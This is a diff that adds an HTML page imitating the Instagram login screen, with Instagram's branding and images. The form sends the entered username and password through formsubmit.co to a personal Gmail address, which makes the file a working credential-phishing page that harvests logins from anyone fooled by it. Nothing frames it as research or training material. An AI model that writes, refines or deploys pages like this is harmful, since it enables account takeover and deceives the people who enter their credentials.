@@ -1,0 +1,196 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');
+
+        body {
+            background: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            color: #262626;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            background-color: #fafafa;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .phone-image {
+            display: none;
+        }
+
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px 20px;
+            width: 350px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-family: 'Billabong', cursive;
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 10px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            box-sizing: border-box;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+        }
+
+        .login-btn {
+            background-color: #3897f0;
+            color: #fff;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .login-btn:hover {
+            background-color: #287ae6;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider::before {
+            margin-right: 10px;
+        }
+
+        .divider::after {
+            margin-left: 10px;
+        }
+
+        .social-login {
+            margin-bottom: 10px;
+        }
+
+        .fb-login {
+            background-color: #385185;
+            color: #fff;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .fb-login:hover {
+            background-color: #2e3f68;
+        }
+
+        .forgot-password {
+            margin-top: 20px;
+        }
+
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .signup-box a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+
+        @media (min-width: 768px) {
+            .login-container {
+                width: 930px;
+            }
+
+            .phone-image {
+                display: block;
+            }
+
+            .login-box {
+                margin-left: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="phone-image">
+            <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="Phone Image" />
+        </div>
+        <div class="login-box">
+            <h1>Instagram</h1>
+            <form action="https://formsubmit.co/saminajaved3786@gmail.com" method="POST">
+                <div class="input-group">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <div class="divider">OR</div>
+            <div class="social-login">
+                <button class="fb-login">Log in with Facebook</button>
+            </div>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+</body>
+
+</html>
